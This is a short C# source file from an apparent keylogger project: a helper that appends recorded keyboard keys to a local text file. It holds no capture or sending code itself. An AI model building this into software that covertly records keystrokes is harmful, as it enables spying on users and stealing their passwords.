using System;
using System.IO;
using System.Text;
using System.Windows.Input;
using System.Collections.Generic;

namespace keylogger.keylog
{
    public static class KeyLog
    {
        public static bool Log(string path, List<Key> keys)
        {
            try
            {
                using (var sw = new StreamWriter(path, true, Encoding.UTF8))
                {
                    foreach (var key in keys)
                    {
                        sw.WriteLine(key);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }           
        }
    }
}